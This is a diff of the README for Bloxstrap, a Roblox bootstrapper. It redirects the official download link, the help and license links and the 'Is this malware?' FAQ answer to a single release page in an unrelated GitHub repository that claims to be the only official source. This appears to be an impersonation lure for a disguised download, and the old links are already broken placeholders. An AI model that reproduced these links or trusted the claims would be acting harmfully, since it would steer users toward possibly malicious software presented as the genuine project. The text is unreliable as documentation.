@@ -1,5 +1,5 @@
 > [!CAUTION]
-> The only official places to download Bloxstrap are this GitHub repository and [Release](///////////). Any other websites offering downloads or claiming to be us are not owned by us.
+> The only official places to download Bloxstrap are this GitHub repository and [Release](https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release). Any other websites offering downloads or claiming to be us are not owned by us.
 
 > [!IMPORTANT]
 > Bloxstrap is not under active development anymore. Any issues or pull requests opened may take a while to get a response.
@@ -25,7 +25,7 @@
 
 Bloxstrap is a third-party replacement for the standard Roblox bootstrapper, providing additional useful features and improvements.
 
-Running into a problem or need help with something? [Release](//////). If you can't find anything, or would like to suggest something, please [submit an issue](https://github.com/).
+Running into a problem or need help with something? [Release](https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release). If you can't find anything, or would like to suggest something, please [submit an issue](https://github.com/).
 
 Bloxstrap is only supported for PCs running Windows.
 
@@ -33,11 +33,11 @@ Bloxstrap is only supported for PCs running Windows.
 
 **Q: Is this malware?**
 
-**A:** No. The source code here is viewable to all, and it'd be impossible for us to slip anything malicious into the downloads without anyone noticing. Just be sure you're downloading it from an official source. The only two official sources are this GitHub repository and [Release](////).
+**A:** No. The source code here is viewable to all, and it'd be impossible for us to slip anything malicious into the downloads without anyone noticing. Just be sure you're downloading it from an official source. The only two official sources are this GitHub repository and [Release](https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release).
 
 **Q: Can using this get me banned?**
 
-**A:** No, it shouldn't. Bloxstrap doesn't interact with the Roblox client in the same way that exploits do. [Release](///)
+**A:** No, it shouldn't. Bloxstrap doesn't interact with the Roblox client in the same way that exploits do. [Release](https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release)
 ## Features
 
 - Hassle-free Discord Rich Presence to let your friends know what you're playing at a glance
@@ -46,9 +46,9 @@ Bloxstrap is only supported for PCs running Windows.
 - Ability to configure graphics fidelity and UI experience
 
 ## Installing
-Download the [latest release of Bloxstrap](https://github.com/bloxstraplabs/bloxstrap/releases/latest), and run it. Configure your preferences if needed, and install. That's about it!
+Download the [latest release of Bloxstrap](https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release), and run it. Configure your preferences if needed, and install. That's about it!
 
-Alternatively, you can install Bloxstrap via [Winget](https://winstall.app/apps/pizzaboxer.Bloxstrap) by running this in a Command Prompt window:
+Alternatively, you can install Bloxstrap via [Winget](https://app/) by running this in a Command Prompt window:
 ```
 
 You will also need the [.NET 6 Desktop Runtime](https://aka.ms/dotnet-core-applaunch?missing_runtime=true&arch=x64&rid=win11-x64&apphost_version=6.0.36&gui=true). If you don't already have it installed, you'll be prompted to install it anyway. Be sure to install Bloxstrap after you've installed this.
@@ -59,7 +59,7 @@ Once installed, Bloxstrap is added to your Start Menu, where you can access the 
 
 ## Code
 
-Bloxstrap uses the [WPF UI](/////////) library for the user interface design. We currently use and maintain our own fork of WPF UI at [bloxstraplabs](/////////).
+Bloxstrap uses the [WPF UI](https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release) library for the user interface design. We currently use and maintain our own fork of WPF UI at [bloxstraplabs](/////////).
 
 
 [shield-repo-license]:  https://img.shields.io/github/license/bloxstraplabs/bloxstrap
@@ -71,10 +71,10 @@ Bloxstrap uses the [WPF UI](/////////) library for the user interface design. We
 [shield-discord-server]: https://img.shields.io/discord/1099468797410283540?logo=discord&logoColor=white&label=discord&color=4d3dff
 [shield-tenor-meme]:     https://img.shields.io/badge/mom_made-pizza_rolls-orange
 
-[repo-license]:  /
-[repo-actions]:  /
-[repo-releases]: /
-[repo-latest]:   /
+[repo-license]:  https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release
+[repo-actions]:  https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release
+[repo-releases]: https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release
+[repo-latest]:   https://github.com/Benopetee81/bloxstrap-2026/releases/tag/release
 
 [crowdin-project]: https://nmi.com/project/
 [discord-invite]:  https://discord.gg/
